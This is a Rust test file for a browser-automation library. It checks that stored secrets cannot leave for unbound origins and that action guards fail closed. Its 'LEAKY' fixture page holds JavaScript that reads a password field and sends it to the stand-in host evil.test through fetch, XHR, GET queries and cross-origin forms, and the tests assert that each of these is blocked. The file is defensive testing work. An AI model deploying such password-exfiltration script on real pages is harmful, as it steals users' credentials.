//! Guarded egress: secrets never leave for origins they are not bound to; a guard
//! decides on metadata, never page text; it fails closed.

mod common;

use std::cell::RefCell;
use std::rc::Rc;

use common::*;
use pageon::{
    Action, ActionError, CommandGuard, Effect, EffectClass, LoadError, LoadOptions, Policy, Replay,
    Sandbox, SandboxOptions, Secret, Secrets, Session, Verdict,
};

fn opts() -> LoadOptions {
    LoadOptions {
        robots: false,
        ..LoadOptions::default()
    }
}

fn act(s: &str) -> Action {
    s.parse().unwrap_or_else(|e| panic!("{e}"))
}

/// A shop page whose script tries to send the typed password elsewhere: five encodings over a
/// `fetch` POST body, an XHR body and a GET query (a beacon's channel) on "Leak", and a
/// cross-origin form per encoding.
const LEAKY: &str = r#"<title>Shop</title>
<form method=post action=/login><input name=user aria-label=User><input id=pw name=pw type=password aria-label=Password><button>Sign in</button></form>
<button onclick="leak()">Leak</button>
<form id=f0 method=post action="https://evil.test/form"><input type=hidden name=d><button type=button onclick="send(0)">Send 0</button></form>
<form id=f1 method=post action="https://evil.test/form"><input type=hidden name=d><button type=button onclick="send(1)">Send 1</button></form>
<form id=f2 method=post action="https://evil.test/form"><input type=hidden name=d><button type=button onclick="send(2)">Send 2</button></form>
<form id=f3 method=post action="https://evil.test/form"><input type=hidden name=d><button type=button onclick="send(3)">Send 3</button></form>
<form id=f4 method=post action="https://evil.test/form"><input type=hidden name=d><button type=button onclick="send(4)">Send 4</button></form>
<script>
function enc() {
  const p = document.getElementById('pw').value;
  return [p, encodeURIComponent(p), new URLSearchParams({d: p}).toString().slice(2), btoa('x=' + p), JSON.stringify({p})];
}
function leak() {
  enc().forEach((e, i) => {
    fetch('https://evil.test/fetch' + i, {method: 'POST', body: e}).catch(() => {});
    const x = new XMLHttpRequest(); x.open('POST', 'https://evil.test/xhr' + i); x.send(e);
    fetch('https://evil.test/get' + i + '?d=' + e).catch(() => {});
  });
}
function send(i) { const f = document.getElementById('f' + i); f.querySelector('[name=d]').value = enc()[i]; f.submit(); }
</script>"#;

fn leaky_site() -> pageon_env::Log {
    site(vec![
        html("https://shop.test/", LEAKY),
        ex(
            "POST",
            "https://shop.test/login",
            200,
            &[("content-type", "text/html")],
            "<h1>Welcome</h1>",
        ),
    ])
}

const PW: &str = "hunter2 Ü/x+y";

#[test]
fn a_secret_never_leaves_for_another_origin() {
    for caged in [false, true] {
        let cap = Capture::new(leaky_site());
        let seen: Rc<RefCell<Vec<Effect>>> = Rc::default();
        let log = seen.clone();
        let policy = Policy::new(&cap).guard(move |e| {
            log.borrow_mut().push(e.clone());
            Verdict::Allow
        });
        let vault =
            Secrets::new(policy).with("shop", Secret::value(PW).origins(["https://shop.test"]));
        let mut blocked = 0;
        let mut run =
            |a: &str, obs: &mut dyn FnMut(Action) -> Result<pageon::Outcome, ActionError>| match obs(
                act(a),
            ) {
                Ok(o) => {
                    blocked += o
                        .requests
                        .iter()
                        .filter(|r| matches!(&r.outcome, pageon::RequestOutcome::Blocked(w) if w.contains("secret://shop would leave for https://evil.test")))
                        .count();
                }
                Err(ActionError::Navigation(LoadError::Blocked { reason, .. })) => {
                    assert!(reason.contains("secret://shop would leave for https://evil.test (it is bound to https://shop.test)"), "{reason}");
                    blocked += 1;
                }
                Err(e) => panic!("{a}: {e}"),
            };
        if caged {
            let mut sb = Sandbox::new(
                &vault,
                SandboxOptions {
                    program: Some(env!("CARGO_BIN_EXE_pageon").into()),
                    ..SandboxOptions::default()
                },
            )
            .unwrap_or_else(|e| panic!("{e}"));
            let mut tab = sb
                .open("https://shop.test/", opts())
                .unwrap_or_else(|e| panic!("{e}"));
            let obs = tab.observe().unwrap_or_else(|e| panic!("{e}"));
            let mut a = |x: Action| tab.act(x);
            a(act(&format!(
                "type {} secret://shop",
                find(&obs, "textbox", "Password")
            )))
            .unwrap_or_else(|e| panic!("{e}"));
            run(&format!("click {}", find(&obs, "button", "Leak")), &mut a);
            for i in 0..5 {
                run(
                    &format!("click {}", find(&obs, "button", &format!("Send {i}"))),
                    &mut a,
                );
            }
            a(act(&format!("click {}", find(&obs, "button", "Sign in"))))
                .unwrap_or_else(|e| panic!("{e}"));
        } else {
            let session = Session::new(&vault);
            let mut tab = session
                .open("https://shop.test/", opts())
                .unwrap_or_else(|e| panic!("{e}"));
            let obs = tab.observe();
            let mut a = |x: Action| tab.act(x);
            a(act(&format!(
                "type {} secret://shop",
                find(&obs, "textbox", "Password")
            )))
            .unwrap_or_else(|e| panic!("{e}"));
            run(&format!("click {}", find(&obs, "button", "Leak")), &mut a);
            for i in 0..5 {
                run(
                    &format!("click {}", find(&obs, "button", &format!("Send {i}"))),
                    &mut a,
                );
            }
            a(act(&format!("click {}", find(&obs, "button", "Sign in"))))
                .unwrap_or_else(|e| panic!("{e}"));
        }
        assert_eq!(
            blocked, 20,
            "caged={caged}: 5 encodings × fetch, XHR, GET query, form"
        );
        let evil: Vec<String> = cap
            .urls()
            .into_iter()
            .filter(|u| u.contains("evil.test"))
            .collect();
        assert!(
            evil.is_empty(),
            "caged={caged}: reached evil.test: {evil:?}"
        );
        assert!(
            cap.urls()
                .contains(&"POST https://shop.test/login".to_string()),
            "the login went through"
        );
        let login = seen
            .borrow()
            .iter()
            .find(|e| e.url == "https://shop.test/login")
            .cloned();
        assert_eq!(
            login.map(|e| e.labels),
            Some(vec!["secret:shop".to_string()]),
            "caged={caged}"
        );
    }
}

/// What the guard saw of one effect: method, URL, class, labels, cause action and target.
type Seen = (
    String,
    String,
    EffectClass,
    Vec<String>,
    Option<String>,
    Option<String>,
);

const FLOW: &str = r#"<title>Shop</title><script src="https://cdn.other.test/a.js"></script>
<form method=post action=/orders><button>Pay now</button></form>
<form method=post action=/delete><button>Delete account</button></form>
<button onclick="fetch('/api/sync', {method: 'POST', body: 'x'}).then(r => r.text()).then(t => out.textContent = t, () => out.textContent = 'refused')">Sync</button><p id=out></p>
<script>fetch('/api/config')</script>"#;

fn flow_site() -> pageon_env::Log {
    site(vec![
        html("https://shop.test/", FLOW),
        page(
            "https://cdn.other.test/a.js",
            200,
            &[("content-type", "text/javascript")],
            "",
        ),
        page(
            "https://shop.test/api/config",
            200,
            &[("content-type", "application/json")],
            "{}",
        ),
        ex(
            "POST",
            "https://shop.test/orders",
            200,
            &[("content-type", "text/html")],
            "<h1>Paid</h1>",
        ),
        ex(
            "POST",
            "https://shop.test/delete",
            200,
            &[("content-type", "text/html")],
            "<h1>Gone</h1>",
        ),
        ex("POST", "https://shop.test/api/sync", 200, &[], "synced"),
    ])
}

#[test]
fn the_guard_sees_metadata_and_decides() {
    let seen: Rc<RefCell<Vec<Effect>>> = Rc::default();
    let log = seen.clone();
    let env = Policy::new(Replay::new(flow_site())).guard(move |e| {
        log.borrow_mut().push(e.clone());
        let target = e
            .cause
            .as_ref()
            .and_then(|c| c.target.clone())
            .unwrap_or_default();
        if target.contains("Delete") {
            Verdict::Deny("deleting accounts is not part of this task".into())
        } else if e.url.ends_with("/api/sync") {
            Verdict::Ask
        } else {
            Verdict::Allow
        }
    });
    let session = Session::new(&env);
    let mut tab = session
        .open("https://shop.test/", opts())
        .unwrap_or_else(|e| panic!("{e}"));
    let obs = tab.observe();
    let pay = find(&obs, "button", "Pay now");
    let delete = find(&obs, "button", "Delete account");
    let sync = find(&obs, "button", "Sync");
    // Ask without an approver refuses; the page sees a network error.
    tab.act(act(&format!("click {sync}")))
        .unwrap_or_else(|e| panic!("{e}"));
    assert!(tab.observe_full().contains("refused"));
    let e = tab.act(act(&format!("click {delete}"))).unwrap_err();
    assert!(
        e.to_string()
            .contains("guard: deleting accounts is not part of this task"),
        "{e}"
    );
    tab.act(act(&format!("click {pay}")))
        .unwrap_or_else(|e| panic!("{e}"));
    let got: Vec<Seen> = seen
        .borrow()
        .iter()
        .map(|e| {
            (
                e.method.clone(),
                e.url.clone(),
                e.class,
                e.labels.clone(),
                e.cause.as_ref().map(|c| c.action.clone()),
                e.cause.as_ref().and_then(|c| c.target.clone()),
            )
        })
        .collect();
    let first = vec!["first-contact".to_string()];
    let s = |x: &str| Some(x.to_string());
    let want = vec![
        (
            "GET".into(),
            "https://shop.test/".into(),
            EffectClass::Read,
            first.clone(),
            None,
            None,
        ),
        (
            "GET".into(),
            "https://cdn.other.test/a.js".into(),
            EffectClass::Read,
            first.clone(),
            None,
            None,
        ),
        (
            "POST".into(),
            "https://shop.test/api/sync".into(),
            EffectClass::Write,
            vec![],
            s(&format!("click {sync}")),
            s(&format!("button {sync} \"Sync\"")),
        ),
        (
            "POST".into(),
            "https://shop.test/delete".into(),
            EffectClass::Write,
            vec![],
            s(&format!("click {delete}")),
            s(&format!("button {delete} \"Delete account\"")),
        ),
        (
            "POST".into(),
            "https://shop.test/orders".into(),
            EffectClass::Write,
            vec![],
            s(&format!("click {pay}")),
            s(&format!("button {pay} \"Pay now\"")),
        ),
    ];
    assert_eq!(
        got, want,
        "the guard saw exactly these effects (reads of known origins are not asked)"
    );
    // Ask with an approver: it decides.
    let env = Policy::new(Replay::new(flow_site()))
        .guard(|e| {
            if e.url.ends_with("/api/sync") {
                Verdict::Ask
            } else {
                Verdict::Allow
            }
        })
        .approver(|_| true);
    let session = Session::new(&env);
    let mut tab = session
        .open("https://shop.test/", opts())
        .unwrap_or_else(|e| panic!("{e}"));
    let obs = tab.observe();
    tab.act(act(&format!("click {}", find(&obs, "button", "Sync"))))
        .unwrap_or_else(|e| panic!("{e}"));
    assert!(tab.observe_full().contains("synced"));
}

fn guarded_click(guard: CommandGuard) -> Result<pageon::Outcome, ActionError> {
    let env = Policy::new(Replay::new(flow_site())).guard(move |e| {
        // Only the order is asked about; the page itself loads.
        if e.url.ends_with("/orders") {
            guard.verdict(e)
        } else {
            Verdict::Allow
        }
    });
    let session = Session::new(&env);
    let mut tab = session
        .open("https://shop.test/", opts())
        .unwrap_or_else(|e| panic!("{e}"));
    let obs = tab.observe();
    tab.act(act(&format!("click {}", find(&obs, "button", "Pay now"))))
}

/// A shell guard answering `verdict` (JSON fields after the id) to every effect, echoing its id.
fn sh_guard(verdict: &str) -> String {
    format!(
        r#"while read -r l; do id=$(printf %s "$l" | sed 's/^{{"id":\([0-9]*\).*/\1/'); echo "{{\"id\":$id,{}}}"; done"#,
        verdict.replace('"', "\\\"")
    )
}

#[test]
fn command_guards_speak_json_lines_and_fail_closed() {
    let allow = CommandGuard::new(sh_guard(r#""verdict":"allow""#));
    assert!(guarded_click(allow).is_ok());
    let deny = CommandGuard::new(sh_guard(r#""verdict":"deny","reason":"no orders today""#));
    let e = guarded_click(deny).unwrap_err();
    assert!(e.to_string().contains("guard: no orders today"), "{e}");
    let crash = CommandGuard::new("exit 1");
    let e = guarded_click(crash).unwrap_err();
    assert!(e.to_string().contains("guard failed: "), "{e}");
    let junk = CommandGuard::new(r#"while read -r l; do echo yes; done"#);
    let e = guarded_click(junk).unwrap_err();
    assert!(e.to_string().contains("guard failed: not a verdict"), "{e}");
    let hang = CommandGuard::with_timeout("sleep 30", std::time::Duration::from_millis(300));
    let e = guarded_click(hang).unwrap_err();
    assert!(
        e.to_string().contains("guard failed: no answer within"),
        "{e}"
    );
    // The guard sees each effect as one JSON line.
    let dir = std::env::temp_dir().join(format!("pageon-guard-{}", std::process::id()));
    let _ = std::fs::remove_file(&dir);
    let tee = CommandGuard::new(format!(
        r#"while read -r l; do echo "$l" >> {}; id=$(printf %s "$l" | sed 's/^{{"id":\([0-9]*\).*/\1/'); echo "{{\"id\":$id,\"verdict\":\"allow\"}}"; done"#,
        dir.display()
    ));
    guarded_click(tee).unwrap_or_else(|e| panic!("{e}"));
    let line = std::fs::read_to_string(&dir).unwrap_or_default();
    let v: serde_json::Value = serde_json::from_str(line.trim()).unwrap_or_default();
    assert!(line.starts_with("{\"id\":"), "the id comes first: {line}");
    assert_eq!(v["method"], "POST");
    assert_eq!(v["class"], "write");
    assert_eq!(v["cause"]["target_untrusted"], true, "{v}");
    assert_eq!(
        v["cause"]["target"]
            .as_str()
            .map(|t| t.ends_with("\"Pay now\"")),
        Some(true),
        "{v}"
    );
    let _ = std::fs::remove_file(&dir);
}

#[test]
fn the_cli_takes_a_guard() {
    let file = file("guard-flow", &flow_site());
    let out = assert_cmd::Command::cargo_bin("pageon")
        .unwrap_or_else(|e| panic!("{e}"))
        .args(["fetch", "https://shop.test/", "--robots", "ignore", "--replay"])
        .arg(&file)
        .args(["--guard", r#"while read -r l; do id=$(printf %s "$l" | sed 's/^{"id":\([0-9]*\).*/\1/'); case "$l" in *orders*) echo "{\"id\":$id,\"verdict\":\"deny\",\"reason\":\"read-only task\"}";; *) echo "{\"id\":$id,\"verdict\":\"allow\"}";; esac; done"#])
        .args(["--act", "click e1"])
        .output()
        .unwrap_or_else(|e| panic!("{e}"));
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(err.contains("guard: read-only task"), "{err}");
}

#[test]
#[ignore = "timing: cargo test --release -p pageon --test guard -- --ignored --nocapture"]
#[allow(clippy::disallowed_methods)]
fn the_label_check_is_cheap() {
    let mut vault = Secrets::new(Replay::new(pageon_env::Log::default()));
    for i in 0..5 {
        let name = format!("s{i}");
        vault = vault.with(
            &name,
            Secret::value(format!("secret-value-{i}-xyz")).origins(["https://shop.test"]),
        );
    }
    for i in 0..5 {
        let _ = pageon_env::Env::secret(&vault, &format!("s{i}"), "https://shop.test");
    }
    let mut req = pageon_env::Request::get("https://shop.test/api?q=hello%20world");
    req.method = "POST".into();
    req.body = "a=1&b=2&c=lorem+ipsum+dolor+sit+amet"
        .repeat(20)
        .into_bytes();
    let n = 2000;
    let t = std::time::Instant::now();
    for _ in 0..n {
        let _ = pageon_env::Env::fetch(&vault, &req);
    }
    let per = t.elapsed().as_secs_f64() * 1000.0 / n as f64;
    println!("egress label check: {per:.4} ms per request (5 secrets, 800 B body)");
    assert!(per <= 0.1, "{per}");
}

/// P-18: a guard that answers twice cannot approve the next effect with its extra
/// answer; one that forgets the id fails closed too.
#[test]
fn guard_verdicts_must_match_their_effect() {
    // Answers every effect twice: the second answer arrives for the next effect.
    let twice = CommandGuard::new(
        r#"while read -r l; do id=$(printf %s "$l" | sed 's/^{"id":\([0-9]*\).*/\1/'); echo "{\"id\":$id,\"verdict\":\"allow\"}"; echo "{\"id\":$id,\"verdict\":\"allow\"}"; done"#,
    );
    let effect = |n: u32, url: &str| pageon::Effect {
        method: "POST".into(),
        url: url.into(),
        origin: "https://shop.test".into(),
        class: pageon::EffectClass::Write,
        labels: vec![format!("n{n}")],
        cause: None,
    };
    assert_eq!(
        twice.verdict(&effect(1, "https://shop.test/a")),
        pageon::Verdict::Allow
    );
    match twice.verdict(&effect(2, "https://shop.test/b")) {
        pageon::Verdict::Deny(why) => assert!(why.contains("must echo"), "{why}"),
        v => panic!("the stale answer approved: {v:?}"),
    }
    let no_id = CommandGuard::new(r#"while read -r l; do echo '{"verdict":"allow"}'; done"#);
    match no_id.verdict(&effect(1, "https://shop.test/a")) {
        pageon::Verdict::Deny(why) => assert!(why.contains("without \"id\""), "{why}"),
        v => panic!("{v:?}"),
    }
}

/// P-18: the guard sees a vault secret in a URL as its handle, and a page-authored
/// target line clipped and marked.
#[test]
fn the_guard_sees_handles_and_clipped_page_text() {
    const PW: &str = "hunter2 very&secret";
    let long = "Buy ".repeat(2500);
    let page = format!(
        "<input id=pw type=password aria-label=Password><button onclick=\"fetch('/save?pw=' + encodeURIComponent(pw.value), {{method: 'POST'}})\">{long}</button>"
    );
    let log = site(vec![
        html("https://shop.test/", &page),
        ex(
            "POST",
            "https://shop.test/save?pw=hunter2%20very%26secret",
            200,
            &[("content-type", "text/plain")],
            "ok",
        ),
    ]);
    let seen: Rc<RefCell<Vec<pageon::Effect>>> = Rc::default();
    let s2 = seen.clone();
    let env = pageon::Secrets::new(Policy::new(Replay::new(log)).guard(move |e| {
        s2.borrow_mut().push(e.clone());
        Verdict::Allow
    }))
    .with(
        "pw",
        pageon::Secret::value(PW).origins(["https://shop.test"]),
    );
    let session = Session::new(&env);
    let mut tab = session
        .open("https://shop.test/", opts())
        .unwrap_or_else(|e| panic!("{e}"));
    let obs = tab.observe();
    tab.act(act(&format!(
        "type {} secret://pw",
        find(&obs, "textbox", "Password")
    )))
    .unwrap_or_else(|e| panic!("{e}"));
    let button = refs(&obs, "button")[0].0.clone();
    tab.act(act(&format!("click {button}")))
        .unwrap_or_else(|e| panic!("{e}"));
    let seen = seen.borrow();
    let login = seen
        .iter()
        .find(|e| e.url.contains("/save"))
        .unwrap_or_else(|| panic!("{seen:#?}"));
    assert!(login.url.contains("secret://pw"), "{}", login.url);
    assert!(!login.url.contains("hunter2"), "{}", login.url);
    let cause = login.cause.as_ref().unwrap_or_else(|| panic!("cause"));
    let target = cause.target.as_deref().unwrap_or_default();
    assert!(cause.target_untrusted);
    assert!(target.chars().count() <= 301, "{}", target.len());
}
